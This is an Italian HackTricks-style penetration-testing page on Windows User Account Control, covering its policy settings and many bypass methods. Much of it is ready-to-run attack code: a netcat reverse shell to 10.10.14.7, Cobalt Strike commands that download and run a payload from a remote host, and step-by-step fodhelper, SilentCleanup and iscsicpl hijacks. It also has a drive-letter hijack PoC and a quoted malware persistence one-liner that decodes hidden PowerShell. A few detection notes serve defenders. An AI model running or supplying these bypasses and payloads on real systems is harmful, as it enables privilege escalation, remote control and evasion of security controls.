# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente tali applicazioni/attività ad avere accesso a livello di amministratore per essere eseguite nel sistema. È una funzionalità di praticità che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire le azioni ordinarie a integrità media, e uno con i privilegi di amministratore.

Questa [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in modo molto approfondito il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono usare i criteri di sicurezza per configurare il funzionamento di UAC in base alla propria organizzazione a livello locale (usando secpol.msc), oppure configurarlo e distribuirlo tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono descritte in dettaglio [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Esistono 10 impostazioni Group Policy configurabili per UAC. La tabella seguente fornisce ulteriori dettagli:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Criteri per l'installazione del software su Windows

I **criteri di sicurezza locali** ("secpol.msc" nella maggior parte dei sistemi) sono configurati per impostazione predefinita per **impedire agli utenti non amministratori di eseguire installazioni software**. Ciò significa che, anche se un utente non amministratore può scaricare il programma di installazione del software, non potrà eseguirlo senza un account amministratore.

### Chiavi di registro per obbligare UAC a richiedere l'elevazione

In qualità di utente standard senza diritti di amministratore, puoi fare in modo che l'account "standard" **riceva una richiesta delle credenziali da parte di UAC** quando tenta di eseguire determinate azioni. Questa azione richiederebbe la modifica di determinate **chiavi di registro**, per le quali sono necessarie autorizzazioni di amministratore, a meno che non sia presente un **UAC bypass** o l'attaccante non abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche obbligano l'utente a **reinserire le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, questo è utile solo quando si dispone già di un token elevato, di un UAC bypass o di una configurazione errata che consente di modificare queste chiavi; altrimenti la scrittura nel registro viene bloccata.**

Le chiavi e le voci di registro da modificare sono le seguenti (con i relativi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Questa operazione può essere eseguita anche manualmente tramite lo strumento Local Security Policy. Dopo la modifica, per le operazioni amministrative viene richiesto all'utente di reinserire le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono uscire dai propri account e ottenere i diritti di amministratore senza un exploit di local privilege escalation.

### Richiedere a un utente il «full computer access»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegi UAC

- Internet Explorer Protected Mode usa controlli di integrità per impedire ai processi con un livello di integrità elevato (come i web browser) di accedere a dati con un livello di integrità basso (come la cartella dei file temporanei Internet). Questo viene ottenuto eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere ai dati archiviati nella zona a bassa integrità, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a impedire che gli attacchi di remote code execution accedano ai dati sensibili presenti nel sistema.
- Quando un utente effettua il logon a Windows, il sistema crea un access token che contiene un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, utilizzate per autenticare l'utente al computer e alle risorse presenti sulla rete.

### Autoadminlogon

Per configurare Windows in modo che effettui automaticamente il logon di un utente specifico all'avvio, imposta la **`AutoAdminLogon` registry key**. Questa configurazione è utile negli ambienti kiosk o per scopi di testing. Usala solo su sistemi sicuri, poiché espone la password nel registry.

Imposta le seguenti chiavi utilizzando il Registry Editor o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il comportamento normale del logon, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico alla vittima, l'UAC bypass è immediato, poiché puoi semplicemente fare clic su "Yes" quando compare il prompt UAC

L'UAC bypass è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media e il tuo utente appartiene al gruppo administrators**.

È importante sottolineare che è **molto più difficile eseguire l'UAC bypass se il livello di sicurezza è impostato sul valore più elevato (Always) rispetto a uno qualsiasi degli altri livelli (Default).**

### Triage rapido da una shell a integrità media

Prima di tentare un bypass, conferma di trovarti nello scenario corretto e associa la build dell'host ai metodi noti e funzionanti:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Note pratiche:
- Se `EnableLUA=0`, non è necessario alcun bypass: qualsiasi token amministrativo può richiedere direttamente un livello di integrità elevato.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass auto-elevate / basati su COM.
- `Always Notify` aumenta il livello di difficoltà, ma dovresti comunque testare la build specifica invece di presumere un fallimento: UACME tiene ancora traccia di alcuni metodi `AlwaysNotify compatible` nelle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi amministrativi** (livello di integrità elevato) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che appartiene al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) localmente come nuovo disco e avrai **accesso a tutto ciò che si trova all'interno del file system** (anche alla home dell'utente Administrator).

> [!WARNING]
> **Sembra che questo trick non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al livello di sicurezza massimo
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** dispongono anch'essi di diversi moduli per **bypassare** l'**UAC**.

### Interfacce COM con privilegi elevati (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM con elevazione automatica rimangono una superficie UAC pratica nelle build moderne. `ICMLuaUtil` è ancora indicato da UACME come funzionante nei rami Windows attuali, mentre gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e, talvolta, il masquerading del PEB/processo prima di invocare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consigli pratici:
- Preferire un processo a **64 bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell grezza non funziona, riprovare da un'implementazione BOF / UACME invece di un wrapper `CreateProcess` ingenuo.
- Prevedere che l'esecuzione del processo figlio avvenga in un **processo separato con privilegi elevati**; molti BOF non elevano il beacon corrente in-place.

### KRBUACBypass

Documentazione e tool disponibili su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit per il bypass dell'UAC

[**UACME** ](https://github.com/hfiref0x/UACME), che è una **raccolta** di diversi exploit per il bypass dell'UAC. Si noti che sarà necessario **compilare UACME usando Visual Studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`); sarà necessario sapere **quale serve.**\
È necessario prestare **attenzione**, perché alcuni bypass **visualizzeranno prompt per altri programmi** che **avviseranno** l'**utente** che sta accadendo qualcosa.<sup>[[3]](#references)</sup>

UACME indica la **build a partire dalla quale ciascuna tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> È possibile cercare una tecnica compatibile con le proprie versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, usando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina si ottiene la release di Windows `1607` dalle versioni della build.

Un workflow pratico consiste nel **valutare prima la build dell'host** e solo dopo eseguire il metodo corrispondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` confronta rapidamente la build locale con i metodi UAC conosciuti, utile per scartare velocemente i PoC non più validi.<sup>[[4]](#references)</sup>
- `UACME` rimane il miglior catalogo pubblico per associare un bypass a una build precisa. Le release recenti hanno aggiunto nuovi metodi e rieseguito i test su quelli esistenti contro **Windows 11 25H2**; quindi, prima di presumere che un vecchio post del blog sia ancora applicabile senza modifiche, ricontrolla il README e le note di rilascio.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binary trusted `fodhelper.exe` viene auto-elevated nelle versioni moderne di Windows. Quando viene avviato, interroga il seguente percorso del registro per-user senza convalidare il verbo `DelegateExecute`. Inserendo un comando in quel percorso, un processo con Medium Integrity (l'utente appartiene al gruppo Administrators) può avviare un processo con High Integrity senza un prompt UAC.

Percorso del registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passaggi PowerShell (imposta il payload, quindi attivalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Note:
- Funziona quando l'utente corrente è membro di Administrators e il livello UAC è predefinito/permissivo (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare una PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Evita UI che richiedono interazione per una maggiore furtività.

#### Variante CurVer/extension hijack (solo HKCU)

Sample recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` per-utente. Il binario auto-elevated risolve comunque l'handler in `HKCU`, quindi non è necessario un token amministrativo per creare le chiavi:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta ottenuti privilegi elevati, il malware comunemente **disabilita le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori operazioni di defense evasion (ad esempio, `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistenza per essere eseguito con alta integrità. Una tipica attività di persistenza memorizza su disco uno **script PowerShell cifrato con XOR** e lo decodifica/esegue in memoria ogni ora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante pulisce comunque il dropper e lascia solo gli staged payloads, rendendo il rilevamento dipendente dal monitoraggio dell’**hijack di `CurVer`**, della manomissione di `ConsentPromptBehaviorAdmin`, della creazione di esclusioni di Defender o delle attività pianificate che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite attività `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con i privilegi massimi ed espande `%windir%` dall’ambiente dell’utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione verso un comando arbitrario e ottenere un’integrità elevata senza una finestra di consenso.<sup>[[8]](#references)</sup> Vale ancora la pena testare questo metodo sulle build recenti, perché UACME mantiene attiva la tecnica e il tracciamento degli issue recenti indica che Windows 11 24H2 potrebbe richiedere solo piccoli aggiustamenti alle virgolette.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If il task cita il percorso su quella build, riprova con il payload che termina con una virgolette (ad esempio `cmd.exe"`). Esegui sempre la pulizia di `HKCU\Environment\windir` dopo il test.

#### Altri UAC bypass

Molti UAC bypass classici che abusano dei flussi dell'interfaccia utente, degli oggetti COM o dell'interazione con il desktop richiedono una **full interactive session** con la vittima; una shell comune tramite `nc.exe` o un servizio in esecuzione nella **Session 0** spesso non è sufficiente.

Spesso puoi risolvere il problema usando una sessione **meterpreter**. Esegui la migrazione verso un **processo** che abbia il valore **Session** uguale a **1**:

![Imposta ms-settings su un'estensione personalizzata (.thm) e associa tale estensione al nostro payload - Altri UAC bypass: puoi farlo usando una sessione meterpreter. Esegui la migrazione verso un processo che abbia il valore Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass con GUI

Se hai accesso a una **GUI**, puoi semplicemente accettare la richiesta UAC quando appare; non hai realmente bisogno di un bypass tecnico. Pertanto, ottenere una sessione GUI è spesso sufficiente per aggirare l'ostacolo pratico aggiunto da UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava utilizzando (potenzialmente tramite RDP), **alcuni tool potrebbero essere in esecuzione come administrator** e da lì potresti **eseguire** ad esempio un **cmd** **come admin** direttamente, senza che UAC lo richieda nuovamente, come nel caso di [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### UAC bypass tramite brute-force rumoroso

Se non ti importa di essere rumoroso, puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), che **chiede di elevare i permessi finché l'utente non accetta**.

### Il tuo bypass - Metodologia di base per UAC bypass

Se dai un'occhiata a **UACME**, noterai che **molti UAC bypass abusano del DLL hijacking** (spesso facendo caricare a un binary con privilegi elevati una DLL controllata dall'attaccante da un percorso scrivibile). [Leggi questo per imparare a trovare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che esegua l'**autoelevate** (verifica che, quando viene eseguito, funzioni a un livello di integrità elevato).
2. Con procmon, cerca gli eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **protected paths** (come C:\Windows\System32), dove non disponi dei permessi di scrittura. Puoi aggirare il problema usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo tool viene eseguito con un livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binary vulnerabile e autoelevated.

### Un'altra tecnica di UAC bypass

Consiste nel verificare se un **binary autoElevated** tenta di **leggere** dal **registry** il **nome/percorso** di un **binary** o di un **command** da **eseguire** (questo è più interessante se il binary cerca queste informazioni all'interno di **HKCU**).

### UAC bypass tramite `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` dell'utente

Il binary a 32 bit `C:\Windows\SysWOW64\iscsicpl.exe` è un binary **auto-elevated** che può essere abusato per caricare `iscsiexe.dll` in base all'ordine di ricerca. Se riesci a posizionare una `iscsiexe.dll` malevola all'interno di una cartella **scrivibile dall'utente** e poi modificare il `PATH` dell'utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che tale cartella venga cercata, Windows potrebbe caricare la DLL dell'attaccante all'interno del processo elevato `iscsicpl.exe` **senza mostrare una richiesta UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- È utile quando l'utente corrente appartiene agli **Administrators** ma viene eseguito a **Medium Integrity** a causa di UAC.
- La copia in **SysWOW64** è quella rilevante per questo bypass. Considera la copia in **System32** come un binary separato e convalida il comportamento in modo indipendente.
- La primitive è una combinazione di **auto-elevation** e **DLL search-order hijacking**, quindi lo stesso workflow ProcMon usato per altri UAC bypass è utile per convalidare il caricamento della DLL mancante.

Flusso minimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idee per il rilevamento:
- Generare un alert su `reg add` / scritture nel registro su `HKCU\Environment\Path` seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in posizioni **controllate dall'utente** come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare l'avvio di `iscsicpl.exe` con processi figlio inattesi o caricamenti di DLL al di fuori delle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune chain successive al 2024 non hanno più l'aspetto dei classici registry hijack di `HKCU\Software\Classes`. Ad esempio, l'avvelenamento della activation-context cache può concatenare un **drive remap** e la **DLL redirection** per passare da un'integrità media a una elevata tramite binary di trusted UI / auto-elevated come `ctfmon.exe` e target successivi come `fodhelper.exe`. Invece di duplicare qui il PoC completo, verifica gli esempi compatti di payload in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera dell'unità di Administrator Protection (25H2) tramite per-logon-session DOS device map

Per l'intera attack surface di `RAiLaunchAdminProcess` / UIAccess su Windows 11 25H2, consulta la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” utilizza shadow-admin token con mappe `\Sessions\0\DosDevices/<LUID>` per sessione. La directory viene creata lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona lo shadow-admin token solo a livello **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), consentendo drive-letter link che hanno precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi bassi, chiama `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplica il suo primary token in un token di **identification** e impersonalo durante l'apertura di `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` con l'attaccante come owner.
3. Crea un symlink `C:` che punti a uno storage controllato dall'attaccante; i successivi accessi al filesystem in quella sessione risolveranno `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Riferimenti

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche di bypass di UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per il bypass di UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'AI per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Exploitation 0-Day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass della protezione degli amministratori di Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass di UAC tramite il task SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
